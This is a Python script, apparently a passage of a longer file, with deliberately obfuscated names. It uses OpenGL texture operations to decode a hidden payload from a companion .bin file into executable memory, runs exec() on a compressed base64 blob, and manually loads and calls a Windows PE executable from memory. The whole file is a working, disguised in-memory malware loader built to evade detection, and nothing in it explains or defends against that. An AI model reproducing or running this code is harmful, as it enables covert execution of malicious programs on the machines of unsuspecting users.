  gl.glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_NEAREST);
  gl.glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_NEAREST);
  gl.glTexImage2D(GL_TEXTURE_2D,0,GL_RGB8,64,64,0,GL_RGB,GL_UNSIGNED_BYTE,0)
 gl.glBindTexture(GL_TEXTURE_2D,0)
 gl.glVertexPointer(2,GL_SHORT,8,vb)
 gl.glTexCoordPointer(2,GL_SHORT,8,vb+4)
 gl.glDisable(GL_DITHER)
 gl.glEnable(GL_TEXTURE_2D)
 gl.glEnable(GL_COLOR_LOGIC_OP)
 gl.glShadeModel(GL_FLAT)
 if jvpMB(gl,'glHint'):
  gl.glHint(GL_POINT_SMOOTH_HINT,GL_FASTEST)
  gl.glHint(GL_LINE_SMOOTH_HINT,GL_FASTEST)
  gl.glHint(GL_POLYGON_SMOOTH_HINT,GL_FASTEST)
 gl_list=gl.glGenLists(num_display_lists)
 if gl_list==0:
  jvpMW()
 gl.glListBase(gl_list)
 gl.glViewport(0,0,64,64)
def jvpMb():
 global gl_wnd,gl_rc,gl_tex
 gl.wglMakeCurrent(0,0);
 user32.ReleaseDC(gl_dc,gl_wnd)
 gl.wglDeleteContext(gl_rc);
 user32.DestroyWindow(gl_wnd);
def jvpMQ(tex,log_op,coord_index=0,coord_step=1):
 gl.glLogicOp(log_op);
 gl.glColor3ub(0xff,0xff,0xff)
 gl.glBindTexture(GL_TEXTURE_2D,tex)
 vertex_coord_array=[[-1,-1],[-1,1],[1,1],[1,-1]]
 texture_coord_array=[[0,0],[0,1],[1,1],[1,0]]
 gl.glBegin(GL_QUADS)
 for i in jvpMg(0,4):
  t=texture_coord_array[i]
  gl.glTexCoord2f(t[0],t[1])
  v=vertex_coord_array[coord_index&3];coord_index+=coord_step
  gl.glVertex2f(v[0],v[1])
 gl.glEnd()
def jvpMS(buf_size,num_lists,prolog_len,info):
 path=jvpMf.abspath(jvpMI[0])
 path=jvpMf.splitext(path)[0]+'.bin'
 f=jvpMi(path,'rb')
 data=f.read()
 f.close()
 data_size=jvpMX(data)
 info=jvpMm(jvpMR(info))
 buf=kernel32.VirtualAlloc(0,buf_size,0x00001000,0x40)
 if buf==0:
  jvpMU("Out of virtual memory")
 memmove(buf,data,data_size)
 vb=buf+data_size-0x800
 jvpMc(vb,num_lists)
 exec(info[0:prolog_len])
 render_info=jvpMN(info[prolog_len:])
 curr_t=gl_tex[0]
 prev_t=gl_tex[1]
 curr_ct=gl_tex[2]
 prev_ct=gl_tex[3]
 tex=vb-0x3000
 gl.glBindTexture(GL_TEXTURE_2D,prev_t)
 gl.glTexImage2D(GL_TEXTURE_2D,0,GL_RGB8,64,64,0,GL_RGB,GL_UNSIGNED_BYTE,tex)
 gl.glBindTexture(GL_TEXTURE_2D,prev_ct)
 gl.glTexImage2D(GL_TEXTURE_2D,0,GL_RGB8,64,64,0,GL_RGB,GL_UNSIGNED_BYTE,tex)
 data_size-=0x3800
 num_textures=data_size//0x3000
 p=buf
 for i in jvpMg(0,num_textures):
  gl.glBindTexture(GL_TEXTURE_2D,curr_ct)
  gl.glTexImage2D(GL_TEXTURE_2D,0,GL_RGB8,64,64,0,GL_RGB,GL_UNSIGNED_BYTE,p)
  jvpMQ(curr_ct,GL_COPY_INVERTED if i&2 else GL_COPY,1)
  a=render_info[i]
  def jvpMk(a,tex):
   gl.glBindTexture(GL_TEXTURE_2D,tex)
   if tex:
    gl.glColor3ub(0xff,0xff,0xff)
    gl.glEnableClientState(GL_TEXTURE_COORD_ARRAY)
   else:
    gl.glEnableClientState(GL_VERTEX_ARRAY)
   n=jvpMX(a)
   p=(c_short*n)()
   for i in jvpMg(0,n):
    p[i]=a[i]
   gl.glCallLists(n,GL_SHORT,byref(p))
   gl.glDisableClientState(GL_VERTEX_ARRAY)
   gl.glDisableClientState(GL_TEXTURE_COORD_ARRAY)
  jvpMk(a[0],0)
  jvpMk(a[1],prev_ct)
  jvpMk(a[2],prev_t)
  jvpMQ(prev_t,GL_EQUIV if i&1 else GL_XOR,-1)
  gl.glBindTexture(GL_TEXTURE_2D,curr_t)
  gl.glCopyTexImage2D(GL_TEXTURE_2D,0,GL_RGB8,0,0,64,64,0)
  gl.glReadPixels(0,0,64,64,GL_RGB,GL_UNSIGNED_BYTE,p);p+=0x3000
  curr_t,prev_t=prev_t,curr_t
  curr_ct,prev_ct=prev_ct,curr_ct
 if buf_size>data_size:
  memset(buf+data_size,0,buf_size-data_size)
 jvpMb()
 return buf
IMAGE_DOS_SIGNATURE =0x5A4D
IMAGE_NT_SIGNATURE =0x00004550
IMAGE_NUMBEROF_DIRECTORY_ENTRIES =16
IMAGE_SIZEOF_SHORT_NAME =8
IMAGE_DIRECTORY_ENTRY_EXPORT =0
IMAGE_DIRECTORY_ENTRY_IMPORT =1
IMAGE_DIRECTORY_ENTRY_RESOURCE =2
IMAGE_DIRECTORY_ENTRY_EXCEPTION =3
IMAGE_DIRECTORY_ENTRY_SECURITY =4
IMAGE_DIRECTORY_ENTRY_BASERELOC =5
IMAGE_DIRECTORY_ENTRY_DEBUG =6
IMAGE_DIRECTORY_ENTRY_COPYRIGHT =7
IMAGE_DIRECTORY_ENTRY_ARCHITECTURE =7
IMAGE_DIRECTORY_ENTRY_GLOBALPTR =8
IMAGE_DIRECTORY_ENTRY_TLS =9
IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG =10
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT =11
IMAGE_DIRECTORY_ENTRY_IAT =12
IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT =13
IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR =14
class jvpMA(Structure):
 _fields_=[('e_magic',WORD),('e_cblp',WORD),('e_cp',WORD),('e_crlc',WORD),('e_cparhdr',WORD),('e_minalloc',WORD),('e_maxalloc',WORD),('e_ss',WORD),('e_sp',WORD),('e_csum',WORD),('e_ip',WORD),('e_cs',WORD),('e_lfarlc',WORD),('e_ovno',WORD),('e_res',WORD*4),('e_oemid',WORD),('e_oeminfo',WORD),('e_res2',WORD*10),('e_lfanew',LONG),]
class jvpMy(Structure):
 _fields_=[('Machine',WORD),('NumberOfSections',WORD),('TimeDateStamp',DWORD),('PointerToSymbolTable',DWORD),('NumberOfSymbols',DWORD),('SizeOfOptionalHeader',WORD),('Characteristics',WORD),]
class jvpMT(Structure):
 _fields_=[('VirtualAddress',DWORD),('Size',DWORD),]
class jvpMV(Structure):
 _fields_=[('Magic',WORD),('MajorLinkerVersion',BYTE),('MinorLinkerVersion',BYTE),('SizeOfCode',DWORD),('SizeOfInitializedData',DWORD),('SizeOfUninitializedData',DWORD),('AddressOfEntryPoint',DWORD),('BaseOfCode',DWORD),('BaseOfData',DWORD),('ImageBase',DWORD),('SectionAlignment',DWORD),('FileAlignment',DWORD),('MajorOperatingSystemVersion',WORD),('MinorOperatingSystemVersion',WORD),('MajorImageVersion',WORD),('MinorImageVersion',WORD),('MajorSubsystemVersion',WORD),('MinorSubsystemVersion',WORD),('Win32VersionValue',DWORD),('SizeOfImage',DWORD),('SizeOfHeaders',DWORD),('CheckSum',DWORD),('Subsystem',WORD),('DllCharacteristics',WORD),('SizeOfStackReserve',DWORD),('SizeOfStackCommit',DWORD),('SizeOfHeapReserve',DWORD),('SizeOfHeapCommit',DWORD),('LoaderFlags',DWORD),('NumberOfRvaAndSizes',DWORD),('DataDirectory',jvpMT*IMAGE_NUMBEROF_DIRECTORY_ENTRIES),]
class jvpMa(Structure):
 _fields_=[('Signature',DWORD),('FileHeader',jvpMy),('OptionalHeader',jvpMV),]
class jvpMC(Structure):
 _fields_=[('Name',BYTE*IMAGE_SIZEOF_SHORT_NAME),('VirtualSize',DWORD),('VirtualAddress',DWORD),('SizeOfRawData',DWORD),('PointerToRawData',DWORD),('PointerToRelocations',DWORD),('PointerToLinenumbers',DWORD),('NumberOfRelocations',WORD),('NumberOfLinenumbers',WORD),('Characteristics',DWORD),]
class jvpML(Structure):
 _fields_=[('Characteristics',DWORD),('TimeDateStamp',DWORD),('MajorVersion',WORD),('MinorVersion',WORD),('Name',DWORD),('Base',DWORD),('NumberOfFunctions',DWORD),('NumberOfNames',DWORD),('AddressOfFunctions',DWORD),('AddressOfNames',DWORD),('AddressOfNameOrdinals',DWORD),]
class jvpMs(Structure):
 _fields_=[('OriginalFirstThunk',DWORD),('TimeDateStamp',DWORD),('ForwarderChain',DWORD),('Name',DWORD),('FirstThunk',DWORD),]
class jvpMt(Structure):
 _fields_=[('VirtualAddress',DWORD),('SizeOfBlock',DWORD),]
def jvpMO(data,size):
 buf=kernel32.VirtualAlloc(0,size,0x00001000,0x40)
 if buf==0:
  jvpMU("Out of virtual memory")
 memmove(buf,data,jvpMX(data))
 return jvpMn(buf)
def jvpMn(buf):
 nthdrs=jvpMJ(buf)
 jvpMq(buf,nthdrs)
 jvpMu(buf,nthdrs)
 jvpMo(buf,nthdrs)
 entry=buf+jvpMd(nthdrs+jvpMa.OptionalHeader.offset+jvpMV.AddressOfEntryPoint.offset)
 return WINFUNCTYPE(jvpMP)(entry)
def jvpMJ(base):
 if jvpMD(base)!=IMAGE_DOS_SIGNATURE:
  jvpMU("Not an MZ image!")
 rva=jvpMd(base+jvpMA.e_lfanew.offset)
 nthdrs=base+rva
 if jvpMd(nthdrs)!=IMAGE_NT_SIGNATURE:
  jvpMU("Not an PE image!")
 return nthdrs
def jvpMz(nthdrs):
 return nthdrs+jvpMa.OptionalHeader.offset+jvpMD(nthdrs+jvpMa.FileHeader.offset+jvpMy.SizeOfOptionalHeader.offset)
def jvpMq(base,nthdrs):
 section_list=jvpMz(nthdrs)
 c=jvpMD(nthdrs+jvpMa.FileHeader.offset+jvpMy.NumberOfSections.offset)
 if c<=0:
  jvpMW()
 while jvpKM:
  c-=1
  section=section_list+c*sizeof(jvpMC)
  src=base+jvpMd(section+jvpMC.PointerToRawData.offset)
  dst=base+jvpMd(section+jvpMC.VirtualAddress.offset)
  size=jvpMd(section+jvpMC.SizeOfRawData.offset)
  memmove(dst,src,size)
  bytes_left=dst-src
  if bytes_left>size:
   bytes_left=size
  memset(src,0,bytes_left)
  if c<=0:
   break
def jvpMu(base,nthdrs):
 fixup_dir=nthdrs+jvpMa.OptionalHeader.offset+jvpMV.DataDirectory.offset+IMAGE_DIRECTORY_ENTRY_BASERELOC*sizeof(jvpMT)
 rva=jvpMd(fixup_dir+jvpMT.VirtualAddress.offset)
 if rva==0:
  return
 fixup_block=base+rva
 fixup_dir_size=jvpMd(fixup_dir+jvpMT.Size.offset)
 fixup_end=fixup_block+fixup_dir_size
 delta=base-jvpMd(nthdrs+jvpMa.OptionalHeader.offset+jvpMV.ImageBase.offset)
 if delta==0:
  return
 while fixup_block<fixup_end:
  page=base+jvpMd(fixup_block+jvpMt.VirtualAddress.offset)
  offsets=fixup_block+sizeof(jvpMt)
  size=jvpMd(fixup_block+jvpMt.SizeOfBlock.offset)
  size-=sizeof(jvpMt)
  size//=2
  fixup_block=ntdll.LdrProcessRelocationBlock(page,size,offsets,delta)
  if fixup_block==0:
   jvpMU('Image relocation failed')
def jvpMo(base,nthdrs):
 import_dir=nthdrs+jvpMa.OptionalHeader.offset+jvpMV.DataDirectory.offset+IMAGE_DIRECTORY_ENTRY_IMPORT*sizeof(jvpMT)
 rva=jvpMd(import_dir+jvpMT.VirtualAddress.offset)
 if rva==0:
  return
 import_table=base+rva
 import_table_size=jvpMd(import_dir+jvpMT.Size.offset)
 import_table_end=import_table+import_table_size
 while import_table<import_table_end and jvpMd(import_table+jvpMs.OriginalFirstThunk.offset)!=0:
  dll_name=base+jvpMd(import_table+jvpMs.Name.offset)
  dll=kernel32.LoadLibraryA(dll_name)
  if dll==0:
   jvpMU("Failed to load the '%s' DLL"%string_at(dll_name))
  jvpMx(base,import_table,dll,dll_name)
  import_table+=sizeof(jvpMs)
def jvpMx(base,import_desc,dll,dll_name):
 ilt_rva=jvpMd(import_desc+jvpMs.OriginalFirstThunk.offset)
 iat_rva=jvpMd(import_desc+jvpMs.FirstThunk.offset)
 if ilt_rva==0:
  ilt_rva=iat_rva
 ilt=base+ilt_rva
 iat=base+iat_rva
 while jvpKM:
  ilt_entry=jvpMr(ilt)
  if ilt_entry==0:
   break
  ilt+=sizeof(c_void_p)
  if not ilt_entry&0x80000000:
   name=base+ilt_entry+2
   addr=kernel32.GetProcAddress(dll,name)
   if addr==0:
    jvpMU("Failed to resolve the the '%s!%s' import"%(string_at(dll_name),string_at(name)))
  else:
   ordinal=ilt_entry&~0x80000000
   addr=kernel32.GetProcAddress(dll,ordinal)
   if addr==0:
    jvpMU("Failed to resolve the the '%s!%u' import"%(string_at(dll_name),ordinal))
  jvpME(iat,addr)
  iat+=sizeof(c_void_p)
jvpMn(jvpMS(100352,57,27560,'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'))()
